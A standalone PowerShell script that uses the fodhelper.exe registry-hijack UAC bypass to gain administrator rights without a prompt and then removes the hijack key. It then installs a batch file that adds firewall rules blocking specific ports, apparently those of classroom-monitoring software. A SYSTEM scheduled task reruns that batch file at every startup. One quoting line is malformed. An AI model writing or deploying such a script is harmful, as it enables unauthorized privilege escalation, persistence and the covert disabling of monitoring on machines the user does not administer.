$CurrentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = New-Object Security.Principal.WindowsPrincipal($CurrentIdentity)

if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $RegPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    $Command = "powershell.exe -ExecutionPolicy Bypass -File "$PSCommandPath""
    
    New-Item -Path $RegPath -Force | Out-Null
    New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-Item -Path $RegPath -Value $Command | Out-Null
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    exit
}

$RegPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue

$PayloadPath = "$env:SystemRoot\Temp\lo_blocker.bat"
$BatchContent = @"
@echo off
netsh advfirewall firewall add rule name="LO_Block_TCP" dir=in action=block protocol=TCP localport=11796,796
netsh advfirewall firewall add rule name="LO_Block_UDP" dir=in action=block protocol=UDP localport=796,1053
"@
Set-Content -Path $PayloadPath -Value $BatchContent

$TaskName = "SystemPortBlocker"
$Action = New-ScheduledTaskAction -Execute $PayloadPath
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
